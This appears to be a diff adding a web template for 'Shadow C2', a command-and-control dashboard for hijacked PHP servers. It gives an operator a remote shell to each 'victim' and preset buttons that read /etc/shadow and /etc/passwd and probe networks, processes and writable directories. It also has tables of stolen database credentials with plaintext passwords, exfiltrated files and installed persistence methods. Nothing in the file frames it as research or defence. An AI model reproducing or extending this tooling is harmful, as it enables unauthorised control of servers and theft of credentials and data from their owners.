@@ -1,0 +1,169 @@
+{% extends "base.html" %}
+{% block title %}Shadow C2 — Terminal [{{ victim.hostname or victim.ip }}]{% endblock %}
+{% block page_title %}💻 Terminal — {{ victim.hostname or victim.ip }}{% endblock %}
+
+{% block content %}
+<div class="terminal-container">
+    <!-- Victim Info Bar -->
+    <div class="victim-info-bar">
+        <div class="info-item"><span class="label">UUID:</span> {{ victim.uuid[:12] }}...</div>
+        <div class="info-item"><span class="label">IP:</span> {{ victim.ip }}</div>
+        <div class="info-item"><span class="label">OS:</span> {{ victim.os }}</div>
+        <div class="info-item"><span class="label">PHP:</span> {{ victim.php_version }}</div>
+        <div class="info-item"><span class="label">Server:</span> {{ victim.server_software }}</div>
+        <div class="info-item"><span class="label">Status:</span> <span class="status-dot {{ victim.status }}"></span> {{ victim.status }}</div>
+    </div>
+
+    <!-- Terminal Output -->
+    <div class="terminal-output" id="terminal-output">
+        <div class="terminal-line system">
+            [Shadow C2] Connected to {{ victim.hostname or victim.ip }} ({{ victim.uuid[:8] }})
+        </div>
+        <div class="terminal-line system">
+            [Shadow C2] Type commands below. Results will appear in real-time.
+        </div>
+        <div class="terminal-line system">
+            [Shadow C2] Special commands: __download__/path/to/file, __persist__method
+        </div>
+    </div>
+
+    <!-- Terminal Input -->
+    <div class="terminal-input-container">
+        <span class="prompt">$</span>
+        <input type="text" id="terminal-input" class="terminal-input"
+               placeholder="Enter command..." autofocus
+               onkeydown="if(event.key==='Enter')sendCommand()">
+        <button onclick="sendCommand()" class="btn btn-primary">Send</button>
+    </div>
+
+    <!-- Quick Actions -->
+    <div class="quick-actions">
+        <h4>Quick Actions</h4>
+        <div class="action-buttons">
+            <button onclick="quickCmd('whoami')" class="btn btn-sm btn-secondary">whoami</button>
+            <button onclick="quickCmd('id')" class="btn btn-sm btn-secondary">id</button>
+            <button onclick="quickCmd('uname -a')" class="btn btn-sm btn-secondary">uname -a</button>
+            <button onclick="quickCmd('pwd')" class="btn btn-sm btn-secondary">pwd</button>
+            <button onclick="quickCmd('ls -la')" class="btn btn-sm btn-secondary">ls -la</button>
+            <button onclick="quickCmd('cat /etc/passwd')" class="btn btn-sm btn-secondary">/etc/passwd</button>
+            <button onclick="quickCmd('cat /etc/shadow')" class="btn btn-sm btn-secondary">/etc/shadow</button>
+            <button onclick="quickCmd('ifconfig || ip a')" class="btn btn-sm btn-secondary">Network</button>
+            <button onclick="quickCmd('netstat -tlnp')" class="btn btn-sm btn-secondary">Ports</button>
+            <button onclick="quickCmd('ps aux')" class="btn btn-sm btn-secondary">Processes</button>
+            <button onclick="quickCmd('df -h')" class="btn btn-sm btn-secondary">Disk</button>
+            <button onclick="quickCmd('cat /proc/cpuinfo | head -20')" class="btn btn-sm btn-secondary">CPU</button>
+            <button onclick="quickCmd('find / -writable -type d 2>/dev/null | head -20')" class="btn btn-sm btn-secondary">Writable Dirs</button>
+            <button onclick="quickCmd('crontab -l')" class="btn btn-sm btn-secondary">Crontab</button>
+        </div>
+    </div>
+
+    <!-- Tabs: Credentials / Files / Persistence -->
+    <div class="detail-tabs">
+        <div class="tab-buttons">
+            <button class="tab-btn active" onclick="showTab('creds')">🔑 Credentials</button>
+            <button class="tab-btn" onclick="showTab('files')">📁 Files</button>
+            <button class="tab-btn" onclick="showTab('persist')">🔒 Persistence</button>
+        </div>
+
+        <div class="tab-content" id="tab-creds">
+            <table class="data-table">
+                <thead><tr><th>Service</th><th>Host</th><th>Username</th><th>Password</th><th>Database</th></tr></thead>
+                <tbody>
+                {% for c in creds %}
+                <tr><td>{{ c.service }}</td><td>{{ c.host }}:{{ c.port }}</td>
+                    <td>{{ c.username }}</td><td class="password-cell">{{ c.password }}</td>
+                    <td>{{ c.database_name }}</td></tr>
+                {% endfor %}
+                </tbody>
+            </table>
+        </div>
+
+        <div class="tab-content hidden" id="tab-files">
+            <table class="data-table">
+                <thead><tr><th>Filename</th><th>Direction</th><th>Size</th><th>SHA256</th><th>Date</th></tr></thead>
+                <tbody>
+                {% for f in files %}
+                <tr><td>{{ f.filename }}</td><td>{{ f.direction }}</td>
+                    <td>{{ f.size }}</td><td class="hash-cell">{{ f.sha256[:16] }}...</td>
+                    <td>{{ f.created_at }}</td></tr>
+                {% endfor %}
+                </tbody>
+            </table>
+        </div>
+
+        <div class="tab-content hidden" id="tab-persist">
+            <table class="data-table">
+                <thead><tr><th>Method</th><th>Status</th><th>Details</th><th>Installed</th></tr></thead>
+                <tbody>
+                {% for p in persistence %}
+                <tr><td>{{ p.method }}</td><td>{{ p.status }}</td>
+                    <td>{{ p.details }}</td><td>{{ p.installed_at }}</td></tr>
+                {% endfor %}
+                </tbody>
+            </table>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+const victimId = {{ victim_id }};
+const termOutput = document.getElementById('terminal-output');
+const termInput = document.getElementById('terminal-input');
+
+function sendCommand() {
+    const cmd = termInput.value.trim();
+    if(!cmd) return;
+
+    // Show in terminal
+    appendLine(`$ ${cmd}`, 'command');
+    appendLine('⏳ Queued...', 'pending');
+    termInput.value = '';
+
+    // Send via AJAX
+    fetch('/dashboard/api/command', {
+        method: 'POST', headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({victim_id: victimId, command: cmd})
+    }).then(r => r.json()).then(d => {
+        if(d.command_id) {
+            appendLine(`[queued] Command ID: ${d.command_id}`, 'system');
+        }
+    });
+
+    // Also via WebSocket for real-time
+    socket.emit('send_command', {victim_id: victimId, command: cmd});
+}
+
+function quickCmd(cmd) {
+    termInput.value = cmd;
+    sendCommand();
+}
+
+// Real-time results
+socket.on('command_result', (data) => {
+    appendLine(`[result] Task ${data.task_id} — ${data.status}`, 'system');
+    if(data.output) {
+        appendLine(data.output, 'output');
+    }
+});
+
+function appendLine(text, cls) {
+    const div = document.createElement('div');
+    div.className = `terminal-line ${cls || ''}`;
+    div.textContent = text;
+    termOutput.appendChild(div);
+    termOutput.scrollTop = termOutput.scrollHeight;
+}
+
+function showTab(tab) {
+    document.querySelectorAll('.tab-content').forEach(el => el.classList.add('hidden'));
+    document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
+    document.getElementById(`tab-${tab}`).classList.remove('hidden');
+    event.target.classList.add('active');
+}
+
+// Focus terminal input
+termInput.focus();
+</script>
+{% endblock %}
